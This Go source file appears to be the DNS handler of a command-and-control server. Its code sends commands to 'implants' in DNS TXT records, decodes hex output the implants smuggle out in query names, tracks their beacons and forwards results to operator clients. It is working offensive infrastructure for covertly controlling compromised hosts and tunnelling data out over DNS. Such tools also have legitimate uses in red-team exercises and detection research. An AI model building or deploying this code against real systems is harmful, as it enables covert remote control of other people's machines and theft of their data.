package main

/*
 * dns.go
 * Handle DNS requests
 * By J. Stuart McMurray
 * Created 20180210
 * Last Modified 20180211
 */

import (
	"encoding/hex"
	"fmt"
	"log"
	"runtime"
	"strings"
	"sync"
	"time"

	lru "github.com/hashicorp/golang-lru"
	"github.com/miekg/dns"
	"github.com/miekg/dns/dnsutil"
)

const (
	// DNSCACHESIZE is the size of the dedupe cache.
	DNSCACHESIZE = 10240

	// TASKINGLABEL is the DNS label used to indicate tasking
	TASKINGLABEL = "t"

	// OUTPUTLABEL is the DNS label used to indicate output
	OUTPUTLABEL = "o"
)

var (
	// DOMAIN is the domain to serve
	DOMAIN string
	// AREC holds a A record with the above IP
	AREC *dns.A

	// dnsCache prevents us from repeating answers
	dnsCache     *lru.Cache
	dnsCacheLock = new(sync.Mutex)
)

func init() {
	var err error
	dnsCache, err = lru.New(DNSCACHESIZE)
	if nil != err {
		panic(err)
	}
}

// HandleDNS handles DNS requests
func HandleDNS(w dns.ResponseWriter, r *dns.Msg) {

	/* Response packet */
	m := new(dns.Msg)

	defer func() {
		m.SetReply(r)
		m.MsgHdr.Authoritative = true
		w.WriteMsg(m)
	}()

	/* If there's not one question in the packet, it's not for us */
	if 1 != len(r.Question) {
		m = m.SetRcode(r, dns.RcodeNameError)
		return
	}
	q := r.Question[0]
	q.Name = strings.ToLower(q.Name)

	/* If the question's for the A record of the bare domain, return it. */
	if DOMAIN == q.Name {
		if dns.TypeA == q.Qtype && nil != AREC {
			m.Answer = append(m.Answer, AREC)
		}
		return
	}

	/* We can really only process one of these at once */
	dnsCacheLock.Lock()
	defer dnsCacheLock.Unlock()

	/* If we already have this one, use it again */
	if v, ok := dnsCache.Get(q.Name); ok {
		rr, ok := v.(*dns.TXT)
		if !ok {
			log.Panicf("invalid RR type %T", v)
		}
		/* nil means no tasking */
		if nil != rr {
			m.Answer = append(m.Answer, rr)
		}
		return
	}

	/* Get interesting parts of request.  There should be 4 */
	parts := strings.SplitN(dnsutil.TrimDomainName(q.Name, DOMAIN), ".", 4)
	if 4 != len(parts) {
		m.SetRcode(r, dns.RcodeFormatError)
		return
	}
	var (
		outHex  = parts[0]                  /* Output, in hex */
		counter = parts[1]                  /* Cachebuster */
		mt      = parts[2]                  /* Message Type */
		id      = strings.ToLower(parts[3]) /* Implant ID */
	)

	/* Only TXT records are supported, and only message types t and o */
	if !((mt == TASKINGLABEL && dns.TypeTXT == q.Qtype) ||
		mt == OUTPUTLABEL) ||
		"" == id {
		m.SetRcode(r, dns.RcodeRefused)
		return
	}

	/* Make sure we have an expected message type */
	switch mt {
	case OUTPUTLABEL: /* Output, no need to respond with anything */
		dnsCache.Add(q.Name, (*dns.TXT)(nil))
		updateLastSeen(id)
		go handleOutput(outHex, id)
		return
	case TASKINGLABEL: /* Tasking */
		break /* Handled below */
	default: /* Not something we expect */
		log.Panicf("unpossible message type %q", mt)
	}

	/* Update the last seen time for this implant */
	updateLastSeen(id)

	/* Send beacon to interested clients */
	go sendBeaconToClients(id, counter)

	/* Get the next tasking for this implant */
	t := GetTasking(id)
	if "" == t {
		dnsCache.Add(q.Name, (*dns.TXT)(nil))
		return
	}
	/* Sanitize tasking */
	s := strings.Replace(t, "`", "``", -1)
	s = strings.Replace(s, `\`, `\\`, -1)
	m.Answer = append(m.Answer, &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    30,
		},
		Txt: []string{s},
	})
	dnsCache.Add(q.Name, m.Answer[0])
	log.Printf("[ID-%v] TASKING: %s (%s)", id, t, s)
}

/* handleOutput logs the output sent by the implant with the given ID */
func handleOutput(outHex, id string) {
	/* Make sure the output is valid */
	o, err := hex.DecodeString(outHex)
	if nil != err {
		log.Printf("[ID-%v] ERROR in %q: %v", id, outHex, err)
		return
	}
	s := string(o)

	/* Log the output */
	log.Printf("[ID-%v] OUTPUT: %v (%q)", id, outHex, s)

	/* Send it to interested C2 clients */
	/* Get connected clients, send the output to each one which is watching
	this implant. */
	keys := CLIENTS.Keys()
	for _, key := range keys {
		/* Turn into a Client */
		c, ok := key.(*C2Client)
		if !ok {
			log.Panicf("wrong type for Client: %T", key)
		}
		/* If this is the right ID, or the it matches the regex, send
		the message to the client */
		c.l.Lock()
		if c.id == id {
			/* Don't print \r's on non-windows */
			if "windows" != runtime.GOOS {
				s = strings.Replace(s, "\r", "", -1)
			}
			fmt.Fprintf(c.t, "%s", s)
		}
		c.l.Unlock()
	}
	/* TODO: Finish this */
}

/* updateLastSeen updates the Implant struct with the last seen time */
func updateLastSeen(id string) {
	now := time.Now()

	/* Make sure we have a Implant for this ID */
	IMPLANTS.ContainsOrAdd(id, NewImplant(id))

	/* Get the Implant to update */
	v, ok := IMPLANTS.Get(id)
	if !ok {
		log.Printf("[ID-%v] Forgotten too fast", id)
		return
	}
	i, ok := v.(*Implant)
	if !ok {
		log.Panicf("wrong type of implant: %T", v)
	}

	i.l.Lock()
	defer i.l.Unlock()
	/* Log if this is the first time we've seen this implant */
	if i.seen.IsZero() {
		log.Printf("[ID-%v] Hello.", id)
	}

	/* Update timestamp if the one we have is newer */
	if now.After(i.seen) {
		i.seen = now
	}
}

/* sendBeaconToClients sends a timestamped message to clients interested in the
given ID that it beaconed.  Counter is the cachebusting string. */
func sendBeaconToClients(id, counter string) {
	/* Make sure we have an ID and message */
	if "" == id {
		panic("empty id")
	}
	if "" == counter {
		counter = "(none)"
	}

	/* Get connected clients, send the message to each one which is
	interested. */
	keys := CLIENTS.Keys()
	for _, key := range keys {
		/* Turn into a Client */
		c, ok := key.(*C2Client)
		if !ok {
			log.Panicf("wrong type for Client: %T", key)
		}
		/* If this is the right ID, or the it matches the regex, send
		the message to the client */
		c.l.Lock()
		if (nil != c.r && c.r.MatchString(id)) ||
			("" == c.id && nil == c.r) {
			c.log.Printf("[%v] Beacon (%v)", id, counter)
		}
		c.l.Unlock()
	}
}
